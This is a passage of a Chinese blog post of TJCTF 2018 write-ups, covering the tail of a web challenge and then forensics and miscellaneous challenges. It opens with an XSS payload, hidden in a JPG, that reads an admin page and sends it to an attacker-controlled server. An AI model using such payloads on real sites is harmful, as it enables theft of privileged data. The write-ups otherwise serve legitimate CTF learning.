XMLHttpRequest();x.open(&quot;GET&quot;,&quot;admin&quot;,false);x.send(null);document.location=&quot;http://&lt;your severhost&gt;/j&quot;+x.responseText;/*</code></p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_58.png" alt="img"></p><p>按照刚刚的填充JPG文件方法，计算长度</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_59.png" alt="img"></p><p>再加上前面2个代表长度的标识字节,264+2*2=268,268/2=134，再转16进制，为0x86。再加上JPG的文件头尾格式，得到下图</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_60.png" alt="img"></p><p>上传文件，并且上传完成后再SAVE一遍Posts</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_61.png" alt="img"></p><p>报告提交给admin</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_62.png" alt="img"></p><p>提交成功</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_63.png" alt="img"></p><p>然后坐等自己服务器日志收到的新信息</p><p><img src="/2018/08/13/tjctf2018/tjctf2018_web_64.png" alt="img"></p><p>web已完毕，其他待续。。。。。。。。。</p><p>本文由安全客原创发布<br>以上转载来自<code>安全客</code>：<a href="https://www.anquanke.com/post/id/156434" target="_blank" rel="noopener">TJCTF 2018 Web专题全解析</a><br>安全客 - 有思想的安全新媒体</p><p>这次TJCTF 2018，新姿势的确多多，以下是这次比赛Miscellaneous&amp;Forensics的专题解析。</p><p>菜鸡水平有限，有一道Forensics题，两道Misc至赛后依旧未解出来，相关附件会在之后给出，以下是这次TJCTF的Miscellaneous&amp;Forensics的相关writeup。</p><h4 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h4><h5 id="Forensics-Weird-Logo"><a href="#Forensics-Weird-Logo" class="headerlink" title="Forensics_Weird Logo"></a>Forensics_Weird Logo</h5><p><img src="/2018/08/13/tjctf2018/1534247353801.png" alt="1534247353801"></p><p>下载下来是个图片，<code>StegSolve</code>偏移几下，em~</p><p><img src="/2018/08/13/tjctf2018/1534436664656.png" alt="img"> </p><h5 id="Forensics-Lexington-State-Bank"><a href="#Forensics-Lexington-State-Bank" class="headerlink" title="Forensics_Lexington State Bank"></a>Forensics_Lexington State Bank</h5><p><img src="/2018/08/13/tjctf2018/1534407649282.png" alt="1534407649282"></p><p>这题说难也难，说简单也简单，运用到工具Zsteg，这是个好东西，清晰检测图片每个域的内容，如果上个月打过<code>Isitdtu ctf2018</code>，相信很快做出来，一个命令的事。LSB隐写不是问题。。。。</p><p><img src="/2018/08/13/tjctf2018/1534436687879.png" alt="1534436687879"></p><h5 id="Forensics-Grid-Parser"><a href="#Forensics-Grid-Parser" class="headerlink" title="Forensics_Grid Parser"></a>Forensics_Grid Parser</h5><p><img src="/2018/08/13/tjctf2018/1534407683684.png" alt="1534407683684"></p><p>下载下来，拖到winhex里发现有个<code>PK</code>头，改后缀<code>.zip</code>，打开，尝试一波操作，发现目录<code>movies.grid.zip\xl\media\password.png</code>，非常之可疑解压，拖到winhex里去</p><p><img src="/2018/08/13/tjctf2018/1534436650329.png" alt="img"></p><p>果不其然有个<code>zip</code>，提取出来发现是加密的，爆破（这里爆破，没想到就是两位字母，还去用字典跑，回头看看前面png两个**顿时明白了）</p><p><img src="/2018/08/13/tjctf2018/1534436636049.png" alt="img"></p><p>解压打开咯，其实这也是个送分题</p><p><img src="/2018/08/13/tjctf2018/1534436619713.png" alt="1534436619713"></p><h5 id="Forensics-Weird-Audio-Circuit"><a href="#Forensics-Weird-Audio-Circuit" class="headerlink" title="Forensics_Weird Audio Circuit"></a>Forensics_Weird Audio Circuit</h5><p><img src="/2018/08/13/tjctf2018/1534407714132.png" alt="1534407714132"></p><p>下载下来是个音频文件，不过这题贼变态，之前遇到过一道类似的题目，运用傅里叶级数变幻，通过<code>Adobe Audition CC2017</code>调出彩频图可以看出隐藏的key。这道题<code>Adobe Audition CC2017</code>折磨半天，知道是频率的问题，但是硬是没解出来。原来要运用<code>Nyquist</code> （奈奎斯特）公式，过滤掉特殊频率，这我真的学不来。。orz</p><p><img src="/2018/08/13/tjctf2018/1534414794935.png" alt="1534414794935"></p><p>下面的相关学习链接：<code>https://wiki.audacityteam.org/wiki/Nyquist_Basics:_The_Audacity_Nyquist_Prompt</code></p><p>看了大佬的<a href="https://www.youtube.com/watch?v=ZLO1LipkSFc" target="_blank" rel="noopener">题解</a>,了解了个大概，复现一遍，需要下载<code>audacity</code>，然后打开文件，进行下列操作</p><p><img src="/2018/08/13/tjctf2018/1534414344260.png" alt="1534414344260"></p><p>添加<code>Nyquist</code>命令<code>(lowpass8 (mult *track* (hzosc 10000)) 10000)</code></p><p><img src="/2018/08/13/tjctf2018/1534414385815.png" alt="1534414385815"></p><p>点击确定，点击播放按钮，大概在35~49秒会有声音读出flag，最终flag就不放出了（贼恐怖，英语听力很重要，听都是放慢听）</p><h5 id="Forensics-Ssleepy"><a href="#Forensics-Ssleepy" class="headerlink" title="Forensics_Ssleepy"></a>Forensics_Ssleepy</h5><p><img src="/2018/08/13/tjctf2018/1534407751950.png" alt="1534407751950"></p><p>这题其实跟<code>2018DDCTF</code>的流量分析题差不多，考察点<code>ssl</code>解密。下载下来是个数据包，看下<code>tcp</code>流，发现传输的是<code>ftp</code>，追踪下，可以看到流0有个<code>ftp</code>登陆、传输文件的操作（有个key.zip）</p><p><img src="/2018/08/13/tjctf2018/1534436729219.png" alt="img"></p><p>往后翻翻会发现，一个<code>zip</code></p><p><img src="/2018/08/13/tjctf2018/1534436744256.png" alt="img"></p><p>原始数据保存，打开，发现是个ftp服务的私钥，嗯，接下来思路就清晰了，需要私钥解密ssl，查看完整的数据包</p><p><img src="/2018/08/13/tjctf2018/1534436757826.png" alt="img"></p><p>按照要求填写</p><p><img src="/2018/08/13/tjctf2018/1534436766535.png" alt="img"></p><p><img src="/2018/08/13/tjctf2018/1534436823741.png" alt="img"></p><p>可以看到完整的<code>http</code>请求，那<code>http</code>响应呢？在<code>ssl</code>流里呗，追踪下响应的<code>ssl</code>流，可以看到很明显的<code>jpg</code>图片头部</p><p><img src="/2018/08/13/tjctf2018/1534436838238.png" alt="img"></p><p>原始数据保存，然后删除前面的<code>http</code>头部即可得到一张<code>flag</code>图片</p><p><img src="/2018/08/13/tjctf2018/1534436855531.png" alt="img"></p><p>这里有个插曲——提交图片中的<code>flag</code>一直不对，，后面看了下官方讨论组的通知：</p><p><img src="/2018/08/13/tjctf2018/1534436866369.png" alt="img"></p><p>额。。。。。</p><h5 id="Forensics-We-Will-Rock-You"><a href="#Forensics-We-Will-Rock-You" class="headerlink" title="Forensics_We Will Rock You"></a>Forensics_We Will Rock You</h5><p><img src="/2018/08/13/tjctf2018/1534407799296.png" alt="1534407799296"></p><p>仔细看了下题目，<code>Rock you</code>,em~,下意识想起了<code>kali</code>中<code>wordlists</code>中的<code>rockyou.txt</code>，明显爆破</p><p>这里拿出之前做题的一个<a href="https://github.com/gurnec/btcrecover" target="_blank" rel="noopener">好东西</a>（强烈建议大家把这个项目玩熟，贼有用）然后执行以下命令。</p><p><code>$ python btcrecover.py --passwordlist rockyou.txt --wallet wallet.dat --utf8 --max-eta 9999</code></p><p><img src="/2018/08/13/tjctf2018/1534417710884.png" alt="1534417710884"></p><p>最终<code>flag:tjctf{tinkerbell}</code></p><h5 id="Forensics-Moar-Turtles"><a href="#Forensics-Moar-Turtles" class="headerlink" title="Forensics_Moar Turtles"></a>Forensics_Moar Turtles</h5><p><img src="/2018/08/13/tjctf2018/1534407860905.png" alt="1534407860905"></p><p>看题目意思，<code>XBOX 360</code> 是啥，哦，原来是个游戏手柄啊。下载下来有两个文件</p><p><img src="/2018/08/13/tjctf2018/1534418834784.png" alt="1534418834784"></p><p>打开第一个，usb数据，这下，终于不怕了，上个月做了巅峰极客比赛，刚好复习了一遍</p><p><img src="/2018/08/13/tjctf2018/1534418809740.png" alt="1534418809740"></p><p>tshark提取关键数据</p><p><img src="/2018/08/13/tjctf2018/1534419241715.png" alt="1534419241715"></p><p>然后，又不会了，因为这不是鼠标的操作数据呀。继续网页搜索，找到咯：<code>http://tattiebogle.net/index.php/ProjectRoot/Xbox360Controller/UsbInfo</code></p><p>看了看，发现自己还是天真了。。。。游戏操作手柄，一秒钟可以有多个操作，我还必须记录usb数据流量包的时间，后面重新通过tshark提取流量包，命令：<code>tshark -r flag.pcapng -T fields -e frame.time_relative -e usb.capdata &gt; result.txt</code>，得到下图</p><p><img src="/2018/08/13/tjctf2018/1534420390839.png" alt="1534420390839"></p><p>后面琢磨半天，脚本写出来一半，比赛结束了 ，后面继续肝着，进展很小，看了看大佬们的解题思路，思路还是没错的。这里直接放出大佬们的<a href="http://www.aperikube.fr/docs/tjctf_2018/moarturtles/" target="_blank" rel="noopener">writeup</a>,学艺不精，告辞。</p><h5 id="Forensics-Volatile-Virus"><a href="#Forensics-Volatile-Virus" class="headerlink" title="Forensics_Volatile Virus"></a>Forensics_Volatile Virus</h5><p><img src="/2018/08/13/tjctf2018/1534407904951.png" alt="1534407904951"></p><p>这题，贼好玩，好玩到，从晚上19点开始做题，快到凌晨3点才做出来。下载文件3.6G，哇哦，看起来就好好玩。</p><p><img src="/2018/08/13/tjctf2018/1534436887289.png" alt="img"> </p><p>em~搜索了下，发现是<code>dmp</code>文件，这个简单就是电脑突然蓝屏后，会生成一个<code>dmp</code>文件供用户检测和分析原因。</p><p>搜索过程中，我还找到了分析此<code>dmp</code>文件的工具<code>Windbg</code>，但是打开分析，发现这个<code>dmp</code>文件是32位的<code>win7</code>的数据。尴尬，因为不同系统查看不同系统的<code>dmp</code>文件，因为指令集的差别，会导致分析结果不准确，也就是说W10的<code>Windbg</code>查看<code>win7</code>的<code>dmp</code>文件是行不通的。于是我又去找适合win7的<code>windbg</code>版本，但是，官网的下载链接都失效了，也是很无奈。</p><p><img src="/2018/08/13/tjctf2018/1534422298815.png" alt="1534422298815"></p><p>接着，我尝试各种搜索，运气挺好的收到几篇很棒的文章<a href="http://www.yingzinanfei.com/2016/09/22/volatilityanzhuangjishiyong/" target="_blank" rel="noopener">volatility安装及使用</a>/<a href="http://jxnu.hetianlab.com/html/news/news-2017082601.html" target="_blank" rel="noopener">内存取证三项CTF赛题详解 </a>/<a href="http://www.freebuf.com/column/152545.html" target="_blank" rel="noopener">CTF内存取证入坑指南！稳！</a> , 这让我认识了一个很强大的内存分析工具：<code>Volatility</code></p><p>以上链接建议浏览完，再继续往下走</p><p>命令<code>volatility_2.6_win64_standalone.exe -f file.dmp imageinfo</code>获取此dmp的关键信息</p><p><img src="/2018/08/13/tjctf2018/1534424302081.png" alt="1534424302081"></p><p>正常情况下，<code>AS Layer1</code>的第一个系统消息就是正确的dmp文件对应的系统，所以接下来，我们都将以<code>Win7SP1x86_23418</code>为其系统版本，执行相关的命令。</p><p>接着我们查看下列举缓存在内存的注册表 ，命令<code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 hivelist</code></p><p><img src="/2018/08/13/tjctf2018/1534424553036.png" alt="1534424553036"></p><p>当然，在这里，你可以一个一个去尝试查看他们注册表的详细信息，不过，嘿嘿，等你看了，头就会大了。</p><p>查看进程，命令 <code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 pslist</code></p><p><img src="/2018/08/13/tjctf2018/1534424769441.png" alt="1534424769441"></p><p>在进行到这步时，我仔细上网搜索的每个进程，如果百度出来是windows的应用，那很好，否则，可以怀疑它是木马文件。这里简直坑，在我进行到这步时，有一个<code>DumpIt.exe</code>,我判断它可能为木马文件，而后面的操作也确实证明它大几率是木马文件，仔细分析了很久，但是出题人出题用意不在这，所以我百忙活好久之后，直到拿到正确答案后，还是觉得不可思议。因为，观察到<code>DumpIt.exe</code>，所以我尝试把它提取出来。</p><p>命令<code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 memdump -p 3172 -D xixi/</code></p><p><img src="/2018/08/13/tjctf2018/1534425618558.png" alt="1534425618558"></p><p>这里还有个小坑：</p><p><code>0x85115c00 DumpIt.exe  3172   2292      6       93      1      0 2018-08-06 03:58:14 UTC+0000</code></p><p>对于这个而言，有两个ID，一个是3172，一个是2292，提取的时候，用的是第一个3172，而不是链接讲的第二个</p><p>虽然提取成功后，但是分析时遇到困难，因为这是个数据文件，正常思维下，我们会用binwalk和foremost去尝试分解，而这次，我第一次遇到，虚拟机<code>binwalk</code>分解<code>Dumpit.exe</code>提取出来的dmp文件，虚拟机竟然竟然满了，我尝试了好多遍，甚至重新安装了虚拟机，这个时候，我感觉可能真是我思路错了。</p><p>后面继续执行命令<code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 filescan</code> </p><p><img src="/2018/08/13/tjctf2018/1534426177122.png" alt="1534426177122"></p><p>发现报错了，别担心，输出到一个txt文件就行（这tm也算是一个小坑把），然后你打开那个txt,你会发现贼多的东西。我在这里面浪啊，找啊，前面翻翻，后面瞧瞧，因为在前面进程中，还看到了python.exe,随意搜下<code>.py</code>，没想到搜到个py文件<code>keylogger.py</code> ，再看看它在的目录，天啊，我好像发现了啥</p><p><img src="/2018/08/13/tjctf2018/1534426710640.png" alt="1534426710640"></p><p>根据前面标识号抓出来</p><p><img src="/2018/08/13/tjctf2018/1534427041573.png" alt="1534427041573"></p><p>得到了这个</p><p><img src="/2018/08/13/tjctf2018/1534426960366.png" alt="1534426960366"></p><p>看下内容</p><p><img src="/2018/08/13/tjctf2018/1534427078162.png" alt="1534427078162"></p><p>很好，我看到了另一个文件<code>C:\\Users\\IEUser\\AppData\\Local\\Temp\\logs.pkl</code></p><p>再到刚刚的1.txt里找下，有以下三处：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x000000000f275d50      3      0 R--rwd \Device\HarddiskVolume1r\AppData\Local\Temp\logs.pkl</span><br><span class="line">0x00000000185883d8      8      0 -W-rw- \Device\HarddiskVolume1\Users\IEUser\AppData\Local\Temp\logs.pkl</span><br><span class="line">0x00000000decc23d8      8      0 -W-rw- \Device\HarddiskVolume1\Users\IEUser\AppData\Local\Temp\logs.pkl</span><br></pre></td></tr></table></figure><p>但是符合的应该是第二个和第三个：</p><p>执行命令<code>volatility_2.6_win64_standalone.exe -f file.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x00000000185883d8 -D .</code></p><p><img src="/2018/08/13/tjctf2018/1534427503363.png" alt="1534427503363"></p><p>logs.pkl这里指的应该是<code>pickle data</code> ，百度下<code>pickle data</code> 就会有如何使用python操作</p><p><img src="/2018/08/13/tjctf2018/1534427886300.png" alt="1534427886300"></p><p>这tm什么鬼，不过细心观察，我找到了点东西</p><p><img src="/2018/08/13/tjctf2018/1534428164269.png" alt="1534428164269"></p><p>中间那些阴影处，看到了吗，对照下虚拟键码对照表，拼接下就是<code>TJCTF{TH1S_1S_N0T_A_V1RU5_</code> ，其实，这题还没完，那个时候我看到TJCTF贼开心，然后，呵呵。做到这里我有没思路了，看了看题目<img src="/2018/08/13/tjctf2018/1534428438853.png" alt="1534428438853"></p><p>下载东西，嗯？浏览器，想起之前进程还有<code>chrome.exe</code>，再去试试，但是你会发现，又不行了，因为上面有三个<code>chrome.exe</code>。呵呵呵。。。。。。怎么办，继续，百度，谷歌，github查找资料</p><p>后面中搜查到<code>Volatility</code> 的插件，找到了<a href="https://blog.superponible.com/2014/08/31/volatility-plugin-chrome-history/" target="_blank" rel="noopener">这个</a>, 卧槽，有点激动，可以直接提取。</p><p>不过，又来了个坑，windows下的好像不能支持扩展，只能在ubuntu虚拟机下重新下载咯。（这里按照上面的链接就好）好了之后，开始操作：<code>vol.py --plugins=/home/jianghu/Documents/tjctf2018/volatility-plugins -f file.dmp --profile=Win7SP1x86_23418 chromedownloads --output csv &gt; downloaded_files.csv</code></p><p><img src="/2018/08/13/tjctf2018/1534433941576.png" alt="1534433941576"></p><p>成功，拿出来看看</p><p><img src="/2018/08/13/tjctf2018/1534434040565.png" alt="1534434040565"></p><p>找了半天。。。额。。。mmp,最后发现需要自己一个一个去测排序，像下面这样，按照某个值去排序<img src="/2018/08/13/tjctf2018/1534434128974.png" alt="1534434128974"></p><p>最后，再折腾了下按照<code>received_bytes</code>的大小排序，保证<code>7854}</code>在底部，最后按照<code>received_bytes</code>的大小，从小往大将每行文件尾部累加起来。</p><p><img src="/2018/08/13/tjctf2018/1534434883208.png" alt="1534434883208"></p><p>什么，你要写脚本？也行，不过有个小技巧，复制，粘贴，替换</p><p><img src="/2018/08/13/tjctf2018/1534435182671.png" alt="1534435182671"></p><p>然后随便复制到哪个输入框，最后替换掉空格就行了，得到：</p><p><code}</code></p><p>再把之前得到的flag拼接下（还是有坑，之前的前半截flag要先转化为小写，再拼接）</p><p><code>tjctf{th1s_1s_n0t_a_v1ru5_D73C00EDD0C6F9FD2D9ED2D9E80CBDBE1C494A699E87AAB38B7139DE0B284581C8042C8042C968C5BA5571568EA7037A7037A70375603AF425A238823F6951FA712EEA8B0A9173830C113E76E08FBA833F47BE2CDB2DD8089A9206910445CD445CD445CDA7DFE792C18C4F4FE6B8AF4A560291E09832AC882AC88112E8ED80DED80DED80D02F601D21850D6CF3FBC5CD90D6A89396172757E3F6A6DE516C94491CB1C0A3146C45AB85B669F38D4297BA58CC8B91792F1A51491867D3D0E8401319E8A4812F501F5701F57E3CCD0FB71521B6BD86F3ACBB2E887181F0E71C20F32DC65BC5BEC8C1728BC391CEECF8530A3864C86B545F5ECDA182941F9C27CC11B53FB9865E7D2730A42B8A87854}</code></p><p>再转换成MD5就好了，最后答案：<code>0be1ffc97da3488ae7f25bcbf966cb73</code> </p><p><img src="/2018/08/13/tjctf2018/1534435760034.png" alt="1534435760034"></p><h4 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h4><h5 id="Miscellaneous-Trippy"><a href="#Miscellaneous-Trippy" class="headerlink" title="Miscellaneous_Trippy"></a>Miscellaneous_Trippy</h5><p><img src="/2018/08/13/tjctf2018/1534247371572.png" alt="1534247371572"></p><p>打下载下来是个gif文件，一波试水，最后万万没想到，<code>winhex</code>打开搜索下tjctf就出来答案了<img src="/2018/08/13/tjctf2018/1534246708218.png" alt="1534246708218"></p><p>如图</p><p><img src="/2018/08/13/tjctf2018/1534436916430.png" alt="img"></p><h5 id="Miscellaneous-Discord"><a href="#Miscellaneous-Discord" class="headerlink" title="Miscellaneous_Discord!"></a>Miscellaneous_Discord!</h5><p><img src="/2018/08/13/tjctf2018/1534247383062.png" alt="1534247383062"></p><p>这个是比赛第二天出来的“签到题”，加入讨论组就有flag，这个就不展示啦</p><h5 id="Miscellaneous-Interference"><a href="#Miscellaneous-Interference" class="headerlink" title="Miscellaneous_Interference"></a>Miscellaneous_Interference</h5><p><img src="/2018/08/13/tjctf2018/1534247407499.png" alt="1534247407499"></p><p>这题。。呼~这题脑洞有点大，细看两个图片差不多,大小也差不多</p><p><img src="/2018/08/13/tjctf2018/1534248009144.png" alt="1534248009144"></p><p>盲水印试水一波，发现得到一个蓝色的图片…….</p><p><img src="/2018/08/13/tjctf2018/1534248225030.png" alt="1534248225030"></p><p>后面发现思路错了，正确思路是使用StegSolve将v1.png和v2.png进行如下操作</p><p><img src="/2018/08/13/tjctf2018/1534248361641.png" alt="1534248361641"></p><p>额，就是Image Combiner 下，取其SUB的图像保存，再将其与v1.png或者v2.png再次进行XOR，会得到以下图片</p><p><img src="/2018/08/13/tjctf2018/1534248728162.png" alt="1534248728162"></p><p>嗯，没错，在反色下扫扫二维码得到tjctf{m1x1ing_and_m4tchIng_1m4g3s_15_fun} </p><p>额。理解可以这样<code>flag=NOT（ (v1 SUB V2) Xor v1）</code></p><h5 id="Miscellaneous-Nothing-but-Everything"><a href="#Miscellaneous-Nothing-but-Everything" class="headerlink" title="Miscellaneous_Nothing but Everything"></a>Miscellaneous_Nothing but Everything</h5><p><img src="/2018/08/13/tjctf2018/1534247454700.png" alt="1534247454700"></p><p>虽然这题，只有区区的20分，但是，这是觉得贼有意思的题目，题目给了一个压缩包，解压，浏览下全是数字</p><p><img src="/2018/08/13/tjctf2018/1534255658541.png" alt="1534255658541"></p><p>打开其中的HAHAHA.txt</p><p><img src="/2018/08/13/tjctf2018/1534255714001.png" alt="1534255714001"></p><p>……再看看其他的文件，里面都是数字</p><p>卡了好久，比赛第三天才想到，数字，那转16进制，再转ASCII试试</p><p><img src="/2018/08/13/tjctf2018/1534253039430.png" alt="1534253039430"></p><p>em~</p><p>好像懂了，看样子要写个脚本哦。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">d_root = <span class="string">'1262404985085867488371'</span><span class="comment">#root dir</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_sixteen_ascii</span><span class="params">(number)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> hex(int(number))[<span class="number">2</span>:].replace(<span class="string">'L'</span>,<span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">os.chdir(d_root+)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">'.'</span>):<span class="comment">#list dir</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> operate_sixteen_ascii(i)</span><br><span class="line"></span><br><span class="line">c=open(i).read()</span><br><span class="line"></span><br><span class="line">open(operate_sixteen_ascii(i),<span class="string">'w'</span>).write(operate_sixteen_ascii(c))<span class="comment">#decrypt file</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Not successful --&gt; "</span>, i</span><br></pre></td></tr></table></figure><p>运行下，顺便看看有啥惊喜</p><p><img src="/2018/08/13/tjctf2018/1534256442662.png" alt="1534256442662"></p><p>多了两张图片，一个压缩包，暂时没有发现flag，试试两个子目录，改下上面相应的代码即可</p><p><code>os.chdir(d_root+&#39;/1466921579&#39;)</code></p><p>再找了找，就在这个子目录下一个xlsx文件下找到了flag</p><p><img src="/2018/08/13/tjctf2018/1534257098761.png" alt="1534257098761"></p><p>打开即可发现</p><p><img src="/2018/08/13/tjctf2018/1534256830926.png" alt="1534256830926"></p><h5 id="Miscellaneous-Huuuuuge"><a href="#Miscellaneous-Huuuuuge" class="headerlink" title="Miscellaneous_Huuuuuge"></a>Miscellaneous_Huuuuuge</h5><p><img src="/2018/08/13/tjctf2018/1534262213540.png" alt="1534262213540"></p><p>额。。。说实在打开这个网址，有种感觉像web，不出意外，打开是404，那就nmap扫扫咯。em~ ， git~9418</p><p><img src="/2018/08/13/tjctf2018/1534260174264.png" alt="1534260174264"></p><p>这里放个相关的<a href="https://git-scm.com/book/zh/v1/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">git资料</a>链接，其中这里讲到了git-9418端口</p><p><img src="/2018/08/13/tjctf2018/1534262789278.png" alt="1534262789278"></p><p>实际上对于这题以下命令类型才能符合题目的原意：<code>git clone git://xxxxxxxx</code></p><p>好，我们按照如此格式先执行下<code>git clone git://104.154.187.226/huuuuuge</code></p><p><img src="/2018/08/13/tjctf2018/1534264233100.png" alt="1534264233100"></p><p>嗯？有东西，但是下不下来？？？</p><p>那在试试<code>git clone git://104.154.187.226/</code></p><p>这里有个注意的地方：<code>git clone git://104.154.187.226</code>这条命令跟上面是不一样的！！！对比结果如下</p><p><img src="/2018/08/13/tjctf2018/1534263359852.png" alt="1534263359852"></p><p>下载后，查看目录</p><p><img src="/2018/08/13/tjctf2018/1534263835448.png" alt="1534263835448"></p><p>。。。。。cat查看不了，后面把<code>this_is_not_the_flag.img</code>单独拿出来放入winhex,第一次见这种奇葩的东西</p><p><img src="/2018/08/13/tjctf2018/1534263724975.png" alt="1534263724975"></p><p>学习下</p><p><img src="/2018/08/13/tjctf2018/1534263982433.png" alt="1534263982433"></p><p>回到题目，还有另外一个目录，我们再看下包含的文件</p><p><img src="/2018/08/13/tjctf2018/1534264078584.png" alt="1534264078584"></p><p>。。。。什么鬼哦。。到这里卡住了</p><p>后面想想是不是应该往<code>git clone git://104.154.187.226/huuuuuge</code>这个地方想，网上搜索一番</p><p>找到个链接：<a href="https://stackoverflow.com/questions/2466735/how-to-checkout-only-one-file-from-git-repository-sparse-checkout" target="_blank" rel="noopener">https://stackoverflow.com/questions/2466735/how-to-checkout-only-one-file-from-git-repository-sparse-checkout</a></p><p><img src="/2018/08/13/tjctf2018/1534264536784.png" alt="1534264536784"></p><p>em~还有这种操作，只下载个别文件？按照这个命令是按depth来执行了，不管了，试试看<code>$ git clone -n git://104.154.187.226/huuuuuge --depth 1</code></p><p><img src="/2018/08/13/tjctf2018/1534265080004.png" alt="1534265080004"></p><p>然而，没用。再看了一遍帖子的第五点评论，搞鼓了下</p><p><img src="/2018/08/13/tjctf2018/1534265279305.png" alt="1534265279305"></p><p>倒是<code>$ git clone --depth=1 git://104.154.187.226/huuuuuge</code>竟然出来了，有点惊喜。</p><p><img src="/2018/08/13/tjctf2018/1534265181438.png" alt="1534265181438"></p><p>额。。。对于这两次看起来差不多的命令，导致的不同结果，还请师傅们指教。</p><h5 id="Miscellaneous-Learn-My-Flag"><a href="#Miscellaneous-Learn-My-Flag" class="headerlink" title="Miscellaneous_Learn My Flag"></a>Miscellaneous_Learn My Flag</h5><p><img src="/2018/08/13/tjctf2018/1534346794270.png" alt="1534346794270"></p><p>（这题会复杂许多，可以跳过此题，因为相当于从0学习机器学习等知识）</p><p>认真看题目，<code>mathcine learning</code>，em~……不会，怎么办？</p><p>先下载文件吧，file看看文件类型，看不懂，网上搜索一番</p><p><img src="/2018/08/13/tjctf2018/1534347300988.png" alt="1534347300988"></p><p>先简单概述下：</p><p>HDF 是用于存储和分发科学数据的一种自我描述、多对象文件格式。 额~不懂，没关系，先看看这个链接，了解下文件格式大概分哪几类，怎么分的，看其中的表即可：<code>http://poemunfinished.blog.163.com/blog/static/3208213220083333913937/</code></p><p>其中关于HDF文件的描述是这样的：</p><p><img src="/2018/08/13/tjctf2018/1534347432362.png" alt="1534347432362"></p><p>看完后，先记住下它是一种Scientific Data(科学数据)</p><p>这里再引用链接<code>https://blog.csdn.net/Mrhiuser/article/details/69603826</code>中的一个图，简单介绍下HDF5的文件组织（两种数据对象groups and datasets 这个得稍微记下）<img src="/2018/08/13/tjctf2018/1534348615891.png" alt="534348418775"></p><p>说起科学数据，参加过数学建模的童鞋，应该使用过MATLAB，额。。。大体的就不说了，其实建模就是对数据的一种科学分析。机器学习也是对数据的科学分析，将其数据的分析封存在HDF5中。</p><p>咳咳，扯回正题，其实这道题目就是让我们通过HDF5文件知识的认识和学习，剖析出使用的机器学习的算法及其他相关数据。问题来了，对于我这种菜鸡，额，短时间不可能全面贯通机器学习的内容，但是我们可以大概了解下机器学习的大致算法及一些相关性的知识。额，那这题怎么办呢。</p><p>继续引用下某位<a href="https://litna.top/2018/07/16/2018%E7%9C%8B%E9%9B%AA%C2%B7%E4%BA%AC%E4%B8%9CAI-CTF%E5%A4%A7%E6%8C%91%E6%88%98%E7%89%B9%E5%88%AB%E9%A2%98-writeup/" target="_blank" rel="noopener">大佬</a>的链接：</p><p>你会看到第一部分是大佬对HDF5文件剖析的python脚本，偷来用用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> h5py</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_dateset</span><span class="params">(name,d)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(d).__name__ == <span class="string">"Group"</span>:</span><br><span class="line">        print(<span class="string">"      &#123;&#125;"</span>.format(name))</span><br><span class="line">        <span class="keyword">for</span> name1, d1 <span class="keyword">in</span> d.items():</span><br><span class="line">            print_dateset(name1,d1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"      &#123;&#125;: &#123;&#125;"</span>.format(name, d.value.shape)) <span 